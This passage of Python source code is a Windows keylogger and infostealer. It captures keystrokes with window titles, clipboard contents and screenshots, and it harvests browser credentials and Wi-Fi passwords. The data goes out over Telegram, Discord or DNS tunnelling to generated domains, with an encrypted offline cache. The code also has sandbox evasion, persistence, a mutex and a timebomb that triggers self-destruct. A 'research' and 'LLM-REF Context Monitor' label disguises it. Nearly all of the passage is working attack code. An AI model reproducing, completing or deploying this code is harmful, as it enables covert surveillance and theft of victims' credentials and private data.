            success = response.status_code in [200, 204]
            self._update_stats("discord", success)
            return success
        except:
            self._update_stats("discord", False)
            return False
    
    def send_dns(self, data: str) -> bool:
        """FIXED: Proper DNS tunneling with authoritative server control assumed."""
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            json_str = json.dumps(packet)
            encoded = base64.b64encode(json_str.encode()).decode()
            encoded = encoded.replace('+', '-').replace('/', '_').rstrip('=')
            domains = self.dga.get_alternative_domains(3)
            
            success = False
            for i, chunk_start in enumerate(range(0, len(encoded), 50)):
                chunk = encoded[chunk_start:chunk_start+50]
                domain = domains[i % len(domains)]
                subdomain = f"{chunk}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                    success = True  # If any lookup succeeds without exception, we assume transmission
                except:
                    pass
                time.sleep(0.05)
            self._update_stats("dns", success)
            return success
        except:
            self._update_stats("dns", False)
            return False
    
    def save_offline(self, data: str) -> bool:
        try:
            with self._offline_lock:
                encrypted = self.obfuscator.fernet.encrypt(data.encode())
                cache_size = 0
                if os.path.exists(ResearchConfig.OFFLINE_CACHE):
                    cache_size = os.path.getsize(ResearchConfig.OFFLINE_CACHE)
                if cache_size > ResearchConfig.MAX_OFFLINE_CACHE_SIZE:
                    with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                        lines = f.readlines()
                    lines = lines[-100:]
                    with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                        f.writelines(lines)
                with open(ResearchConfig.OFFLINE_CACHE, 'ab') as f:
                    f.write(encrypted + b"\n")
                return True
        except:
            return False
    
    def flush_offline_cache(self):
        if not os.path.exists(ResearchConfig.OFFLINE_CACHE):
            return
        try:
            with self._offline_lock:
                with open(ResearchConfig.OFFLINE_CACHE, 'rb') as f:
                    lines = f.readlines()
                new_lines = []
                for line in lines:
                    try:
                        decrypted = self.obfuscator.fernet.decrypt(line.strip()).decode()
                        if self.send_telegram(decrypted) or self.send_discord(decrypted):
                            continue
                        else:
                            new_lines.append(line)
                    except:
                        new_lines.append(line)
                with open(ResearchConfig.OFFLINE_CACHE, 'wb') as f:
                    f.writelines(new_lines[:500])
        except:
            pass
    
    def exfiltrate(self, data: str, packet_type: str = "keystrokes") -> bool:
        if not data or len(data.strip()) == 0:
            return True
        methods = [
            ("telegram", self.send_telegram),
            ("discord", self.send_discord),
            ("dns", self.send_dns)
        ]
        success = False
        for channel_name, method in methods:
            with self._stats_lock:
                if self.failure_counts.get(channel_name, 0) >= 3:
                    continue
            try:
                if method(data):
                    success = True
                    break
            except:
                self._update_stats(channel_name, False)
                continue
        if not success:
            self.save_offline(data)
        else:
            threading.Thread(target=self.flush_offline_cache, daemon=True).start()
        return success

# ============================================================
# MUTEX MANAGER - FIXED HANDLE LEAK
# ============================================================
class MutexManager:
    _mutex_handle = None
    
    @classmethod
    def create_mutex(cls) -> bool:
        try:
            kernel32 = ctypes.windll.kernel32
            cls._mutex_handle = kernel32.CreateMutexW(None, False, ResearchConfig.MUTEX_NAME)
            if kernel32.GetLastError() == 183:
                kernel32.CloseHandle(cls._mutex_handle)
                sys.exit(0)
            return True
        except:
            return True
    
    @classmethod
    def release_mutex(cls):
        if cls._mutex_handle:
            try:
                ctypes.windll.kernel32.CloseHandle(cls._mutex_handle)
            except:
                pass
            cls._mutex_handle = None

# ============================================================
# ENHANCED KEYLOGGER - FULL INTEGRATION
# ============================================================
class KeyLogger:
    def __init__(self):
        self.buffer: List[str] = []
        self.buffer_lock = threading.Lock()
        self.current_window = ""
        self.c2 = CommandAndControl()
        self.running = True
        self.keystroke_count = 0
        self.last_flush_time = time.time()
        self.window_titles: Dict[str, int] = {}
        self.clipboard_monitor = ClipboardMonitor(self.c2)
        self.screenshot_manager = ScreenshotManager(self.c2, ResearchConfig.SCREENSHOT_INTERVAL)
        self.browser_harvester = BrowserCredentialHarvester(self.c2)
        self.wifi_harvester = WifiPasswordHarvester()
        
    def get_active_window_title(self) -> str:
        try:
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = create_string_buffer((length + 1) * 2)
                user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value
            return "Unknown"
        except:
            return "Unknown"
    
    def format_key(self, key) -> str:
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            elif hasattr(key, 'name'):
                special_map = {
                    'space': ' ',
                    'enter': '\n[ENTER]\n',
                    'tab': '\t',
                    'backspace': '[BS]',
                    'delete': '[DEL]',
                    'ctrl': '[CTRL]',
                    'ctrl_l': '[LCTRL]',
                    'ctrl_r': '[RCTRL]',
                    'shift': '[SHIFT]',
                    'shift_l': '[LSHIFT]',
                    'shift_r': '[RSHIFT]',
                    'alt': '[ALT]',
                    'alt_l': '[LALT]',
                    'alt_r': '[RALT]',
                    'caps_lock': '[CAPS]',
                    'esc': '[ESC]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]',
                    'home': '[HOME]',
                    'end': '[END]',
                    'page_up': '[PGUP]',
                    'page_down': '[PGDN]',
                    'insert': '[INS]',
                    'print_screen': '[PRTSC]',
                    'scroll_lock': '[SCRLK]',
                    'pause': '[PAUSE]',
                    'num_lock': '[NUMLK]',
                    'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]',
                    'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]',
                    'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]'
                }
                return special_map.get(key.name, f'[{key.name.upper()}]')
            return f'[{str(key)}]'
        except:
            return ''
    
    def on_press(self, key):
        if not self.running:
            return False
        try:
            formatted = self.format_key(key)
            if not formatted:
                return True
            current_window = self.get_active_window_title()
            
            self.screenshot_manager.on_window_change(current_window)
            
            with self.buffer_lock:
                if current_window != self.current_window and current_window:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    window_header = f"\n\n[{timestamp}] WINDOW: {current_window}\n"
                    window_header += "-" * 50 + "\n"
                    self.buffer.append(window_header)
                    self.current_window = current_window
                    self.window_titles[current_window] = self.window_titles.get(current_window, 0) + 1
                
                self.buffer.append(formatted)
                self.keystroke_count += 1
                
                if len(self.buffer) > ResearchConfig.MAX_BUFFER_SIZE:
                    self.buffer = self.buffer[-ResearchConfig.MAX_BUFFER_SIZE:]
                
                if self.keystroke_count >= ResearchConfig.KEYSTROKE_FLUSH or (time.time() - self.last_flush_time > 600):
                    self.flush_buffer()
                    
        except Exception as e:
            logger.error(f"Key processing error: {e}")
        return True
    
    def flush_buffer(self):
        if not self.buffer:
            return
        with self.buffer_lock:
            buffer_copy = self.buffer[:]
            self.buffer.clear()
            self.keystroke_count = 0
            self.last_flush_time = time.time()
        try:
            log_content = ''.join(buffer_copy)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            hostname = platform.node()
            username = os.environ.get("USERNAME", "UNKNOWN")
            header = f"[{timestamp}] HOST: {hostname} | USER: {username}\n"
            header += "=" * 60 + "\n"
            full_log = header + log_content
            self.c2.exfiltrate(full_log, "keystrokes")
        except Exception as e:
            logger.error(f"Buffer flush error: {e}")
            with self.buffer_lock:
                self.buffer.extend(buffer_copy)
    
    def heartbeat_loop(self):
        while self.running:
            time.sleep(ResearchConfig.HEARTBEAT_INTERVAL)
            if self.running:
                try:
                    heartbeat = {
                        "type": "heartbeat",
                        "timestamp": datetime.utcnow().isoformat(),
                        "session": self.c2.obfuscator.session_id,
                        "uptime": int(time.time())
                    }
                    self.c2.send_telegram(json.dumps(heartbeat))
                except:
                    pass
    
    def credential_harvest_loop(self):
        """Periodically harvest browser credentials and Wi-Fi passwords."""
        time.sleep(300)  # Wait 5 min after startup
        while self.running:
            try:
                # Browser creds
                self.browser_harvester.run_and_exfiltrate()
                # Wi-Fi passwords
                wifi_data = self.wifi_harvester.harvest()
                self.c2.exfiltrate(wifi_data, "wifi_passwords")
            except:
                pass
            time.sleep(86400)  # Once per day
    
    def timebomb_check_loop(self):
        while self.running:
            time.sleep(3600)
            if ResearchConfig.check_timebomb():
                logger.info("Timebomb triggered - initiating self-destruct")
                self.running = False
                ResearchConfig.self_destruct()
    
    def start(self):
        MutexManager.create_mutex()
        
        self.clipboard_monitor.start()
        self.screenshot_manager.start()
        
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.credential_harvest_loop, daemon=True).start()
        threading.Thread(target=self.timebomb_check_loop, daemon=True).start()
        
        try:
            with input_monitor.Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as e:
            logger.error(f"Listener error: {e}")
        finally:
            self.running = False
            self.flush_buffer()
            MutexManager.release_mutex()

# ============================================================
# MAIN ENTRY POINT
# ============================================================
def main():
    if ResearchConfig.check_timebomb():
        ResearchConfig.self_destruct()
        return
    
    if not EnvironmentValidator.is_safe_to_run():
        logger.debug("Environment validation failed - exiting")
        sys.exit(0)
    
    PersistenceManager.ensure_persistence()
    
    while True:
        try:
            logger.info("Starting LLM-REF Context Monitor v6...")
            keylogger = KeyLogger()
            keylogger.start()
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            break
        except Exception as e:
            logger.error(f"Critical error: {e}")
            time.sleep(ResearchConfig.RETRY_DELAY)
            continue

if __name__ == "__main__":
    main()
